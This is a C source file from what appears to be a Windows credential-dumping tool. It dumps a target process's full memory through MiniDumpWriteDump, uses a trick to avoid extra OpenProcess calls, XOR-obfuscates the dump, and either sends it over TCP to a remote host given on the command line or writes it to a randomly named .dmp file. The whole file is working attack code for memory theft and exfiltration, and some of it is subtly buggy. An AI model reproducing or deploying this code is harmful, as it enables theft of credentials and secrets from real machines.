#include "MiniDumpWriteDump.h"

BOOL MiniDump(HANDLE hTarget, int TargetPid, pCommandLineArgs pCmdArgs)
{
	printf("[+] Dumping PID %d via MiniDumpWriteDump\n", pCmdArgs->TargetgPid);

	CallbackHelper helper;
	helper.bytesRead = 0;
	helper.dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
	if (helper.dumpBuffer == NULL)
	{
		printf("[-] Failed to allocate heap memory for the minidump callback\n");
		GetError(L"HeapAlloc");
		return FALSE;
	}

	MINIDUMP_CALLBACK_INFORMATION callbackInfo = { 0 };
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = &helper;

	// PID is 0 to avoid additional OpenProcess by MiniDumpWriteDump's RtlQueryProcessDebugInformation (Credit goes to @_RastaMouse for this trick)
	BOOL Dumped = MiniDumpWriteDump(hTarget, 0, 0, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);

	if (!Dumped)
	{
		GetError(L"MiniDumpWriteDump");
		goto ReturnFalse;
	}

	printf("[+] Target process has been dumped to memory successfully\n");
	if (pCmdArgs->bEncryptDump)
	{
		int i;
		for (i = 0; i <= helper.bytesRead; i++)
		{
			*((BYTE*)helper.dumpBuffer + i) = *((BYTE*)helper.dumpBuffer + i) ^ 0x4B1D;
		}
	}

	if (pCmdArgs->bSendRemotly)
	{
		printf("[+] Transferring process dump to the remote machine\n");
		if (SendSocket(&helper, pCmdArgs))
		{
			printf("[+] Process dump of PID %d transfered remotely!\n", TargetPid);
			goto ReturnTrue;

		}
		else
		{
			printf("[!] Failed to send the dmp remotly\n");
		}
	}

	WCHAR FileName[11] = { 0 };
	GenerateOutFileName(FileName);
	HANDLE hOutFile = CreateFile(FileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to create the output file\n");
		GetError(L"CreateFile");
		goto ReturnFalse;
	}

	printf("[+] Writing process dump to disk\n");

	if (!WriteFile(hOutFile, helper.dumpBuffer, helper.bytesRead, NULL, NULL))
	{
		printf("[-] Failed to write dump to outfile\n");
		GetError(L"WriteFile");
		CloseHandle(hOutFile);
		DeleteFile(FileName);
		goto ReturnFalse;
	}
	printf("[+] Process dump of PID %d written to outfile: %S\n", TargetPid, FileName);

ReturnTrue:
	HeapFree(GetProcessHeap(), 0, helper.dumpBuffer);
	helper.dumpBuffer = NULL;
	return TRUE;

ReturnFalse:
	HeapFree(GetProcessHeap(), 0, helper.dumpBuffer);
	helper.dumpBuffer = NULL;
	return FALSE;
}

void GenerateOutFileName(WCHAR* pFileName) {

	srand(time(0));
	for (int i = 0; i < 6; i++)
	{
		pFileName[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"[rand() % 52];
	}

	pFileName = wcscat_s(pFileName, 11, L".dmp");

	return;
}

BOOL CALLBACK minidumpCallback(
	PVOID callbackParam,
	const PMINIDUMP_CALLBACK_INPUT callbackInput,
	PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	pCallbackHelper helper = (pCallbackHelper)callbackParam;

	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)helper->dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		helper->bytesRead += bufferSize;
		RtlCopyMemory(destination, source, bufferSize);
		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return TRUE;
	}
	return TRUE;
}

BOOL SendSocket(pCallbackHelper helper, pCommandLineArgs pCmdArgs) {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfoW* result = NULL, * ptr = NULL, hints;
	const char* sendbuf = helper->dumpBuffer;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf("[-] Failed to initialize winsock\n");
		GetError(L"WSAStartup");
		return FALSE;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = GetAddrInfoW(pCmdArgs->ServerInformation.IpAddress, pCmdArgs->ServerInformation.Port, &hints, &result);
	if (iResult != 0)
	{
		printf("[-] Failed to get address info\n");
		GetError(L"GetAddrInfoW");
		WSACleanup();
		return FALSE;
	}

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{

		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET)
		{
			printf("[-] Failed to create the socket\n");
			GetError(L"socket");
			WSACleanup();
			return FALSE;
		}

		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR)
		{
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET)
	{
		printf("[-] Unable to connect to server!\n");
		WSACleanup();
		return FALSE;
	}

	iResult = send(ConnectSocket, sendbuf, helper->bytesRead, 0);
	if (iResult == SOCKET_ERROR)
	{
		printf("[-] Failed to send data through the socket\n");
		GetError(L"send");
		goto ReturnFalse;
	}

	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		printf("[-] Failed to shutdown the connection\n");
		GetError(L"shutdown");
	}

	closesocket(ConnectSocket);
	WSACleanup();
	return TRUE;

ReturnFalse:
	closesocket(ConnectSocket);
	WSACleanup();
	return FALSE;
}
